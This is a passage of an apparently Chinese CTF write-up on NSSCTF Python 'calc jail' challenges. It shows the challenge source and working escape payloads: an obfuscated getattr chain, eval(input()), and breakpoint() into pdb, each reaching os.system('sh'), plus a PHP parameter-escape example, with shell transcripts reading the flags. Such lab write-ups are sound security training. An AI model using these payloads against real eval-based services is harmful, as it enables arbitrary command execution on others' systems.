operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token operator">|</span>_<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span><span class="token operator">></span> <span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">121</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">109</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ lsflag  server<span class="token punctuation">.</span>py$ cat flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>99f92fea<span class="token operator">-</span>d1e0<span class="token operator">-</span>4c04<span class="token operator">-</span><span class="token number">8626</span><span class="token operator">-</span>7489979ba8da<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="calc_jail_beginner_level2"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level2"></a> calc_jail_beginner_level2</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#the length is be limited less than 13</span><span class="token comment">#it seems banned some payload </span><span class="token comment">#Can u escape it?Good luck!</span>WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  _                _                           _       _ _   _                _ ___   | |              (_)                         (_)     (_) | | |              | |__ \  | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) | | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / /  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_  |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|              __/ |                          _/ |                                                 |___/                          |__/                                                                            '''</span><span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the python jail"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Let's have an beginner jail of calc"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">13</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该题要求payload的长度不大于13，那么就不能直接__import__(‘os’).system(‘sh’)</p><p>但是在php命令执行中，有一种参数逃逸</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于这串命令system中POST的参数就会逃逸到参数1中去，对于这个1的长度是没有一点长度限制的</p><p>像这里我们也可以采用类似的手法，想办法搞个命令里面能再输入关键命令，显然<code>input()</code>这个函数就正好符合要求</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28561</span>  _                _                           _       _ _   _                _ ___ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span>__ \ <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span>  <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span> <span class="token operator">/</span> <span class="token operator">/</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span>_ <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>____<span class="token operator">|</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span><span class="token operator">></span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ lsflag  server<span class="token punctuation">.</span>py$ cat flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span>84302f6b<span class="token operator">-</span>8b13<span class="token operator">-</span>4cb2<span class="token operator">-</span>af5e<span class="token operator">-</span>ecb2fbc6cc89<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="calc_jail_beginner_level25"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level25"></a> calc_jail_beginner_level2.5</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#the length is be limited less than 13</span><span class="token comment">#it seems banned some payload </span><span class="token comment">#banned some unintend sol</span><span class="token comment">#Can u escape it?Good luck!</span><span class="token keyword">def</span> <span class="token function">filter</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    BLACKLIST <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">,</span><span class="token string">"eval"</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> BLACKLIST<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string"> has been banned for security reasons'</span></span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  _                _                           _       _ _ _                _ ___    _____  | |              (_)                         (_)     (_) | |              | |__ \  | ____| | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__   | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) | |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/               __/ |                          _/ |                                                       |___/                          |__/                                                                                                            '''</span><span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome to the python jail"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Let's have an beginner jail of calc"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Enter your expression and I will evaluate it for you."</span><span class="token punctuation">)</span>input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token builtin">filter</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">13</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>限制长度不大于13，且ban掉了 exec，input，eval</p><p>经过查阅发现可以使用breakpoint()函数进入pdb调试模式，先用step进入模块，可以说使用list检查代码，发现内容被input_data变量接收</p><p>对其进行赋值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"> nc node5<span class="token punctuation">.</span>anna<span class="token punctuation">.</span>nssctf<span class="token punctuation">.</span>cn <span class="token number">28031</span>  _                _                           _       _ _ _                _ ___    _____ <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token punctuation">(</span>_<span class="token punctuation">)</span>                         <span class="token punctuation">(</span>_<span class="token punctuation">)</span>     <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>              <span class="token operator">|</span> <span class="token operator">|</span>__ \  <span class="token operator">|</span> ____<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> _____   _____<span class="token operator">|</span> <span class="token operator">|</span>  <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>__ <span class="token operator">|</span> <span class="token string">'_ \ / _ \/ _` | | '</span>_ \<span class="token operator">|</span> <span class="token string">'_ \ / _ \ '</span>__<span class="token operator">|</span>   <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _` <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span><span class="token operator">/</span> _ \ \ <span class="token operator">/</span> <span class="token operator">/</span> _ \ <span class="token operator">|</span> <span class="token operator">/</span> <span class="token operator">/</span>  <span class="token operator">|</span>___ \ <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span> <span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __<span class="token operator">/</span>\ V <span class="token operator">/</span>  __<span class="token operator">/</span> <span class="token operator">|</span><span class="token operator">/</span> <span class="token operator">/</span>_ _ ___<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">.</span>__<span class="token operator">/</span> \___<span class="token operator">|</span>\__<span class="token punctuation">,</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>      <span class="token operator">|</span> <span class="token operator">|</span>\__<span class="token punctuation">,</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>_<span class="token operator">|</span>\___<span class="token operator">|</span> \_<span class="token operator">/</span> \___<span class="token operator">|</span>_<span class="token operator">|</span>____<span class="token punctuation">(</span>_<span class="token punctuation">)</span>____<span class="token operator">/</span>              __<span class="token operator">/</span> <span class="token operator">|</span>                          _<span class="token operator">/</span> <span class="token operator">|</span>             <span class="token operator">|</span>___<span class="token operator">/</span>                          <span class="token operator">|</span>__<span class="token operator">/</span>Welcome to the python jailLet's have an beginner jail of calcEnter your expression <span class="token keyword">and</span> I will evaluate it <span class="token keyword">for</span> you<span class="token punctuation">.</span><span class="token operator">></span> breakpoint<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span>Return<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span> <span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>module<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token boolean">None</span><span class="token punctuation">(</span>Pdb<span class="token punctuation">)</span> stepAnswer<span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token operator">-</span><span class="token operator">-</span>Return<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>home<span class="token operator">/</span>ctf<span class="token operator">/</span>server<span class="token punctuation">.</span>py<span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>module<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token boolean">None</span><span class="token operator">-</span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>Pdb<span class="token punctuation">)</span> <span class="token builtin">list</span> <span class="token number">29</span>     input_data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span> <span class="token number">30</span>     <span class="token builtin">filter</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span> <span class="token number">31</span>     <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">13</span><span class="token punctuation">:</span> <span class="token number">32</span>         <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Oh hacker!"</span><span class="token punctuation">)</span> <span class="token number">33</span>         exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token number">34</span>  <span class="token operator">-</span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Answer: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span>EOF<span class="token punctuation">]</span><span class="token punctuation">(</span>Pdb<span class="token punctuation">)</span> input_data<span class="token string">'breakpoint()'</span><span class="token punctuation">(</span>Pdb<span class="token punctuation">)</span> input_data<span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">:</span> can't access tty<span class="token punctuation">;</span> job control turned off$ lsflag  server<span class="token punctuation">.</span>py$ cat flagflag<span class="token operator">=</span>NSSCTF<span class="token punctuation">&#123;</span><span class="token number">70489431</span><span class="token operator">-</span>119a<span class="token operator">-</span>4fd3<span class="token operator">-</span>96ac<span class="token operator">-</span>f8abbd07c7e1<span class="token punctuation">&#125;</span>$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="calc_jail_beginner_level3"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level3"></a> calc_jail_beginner_level3</h4><p><a href="https://cheatsheet.haax.fr/linux-systems/programing-languages/python/#pyjail-generate-a-shell">Offensive Security Cheatsheet (haax.fr)</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>WELCOME <span class="token operator">=</span> <span class="token triple-quoted-string string">'''  _                _                           _       _ _   _                _ ____   | |              (_)                         (_)     (_) | | |              | |___ \  | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) | | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ &lt;  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) | |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/               __/ |                          _/ |                                                  |___/                          |__/                                                                                       '''</span><span class="token keyword">print</span><span class="token punctuation">(</span>WELCOME<span class="token punctuation">)</span><span 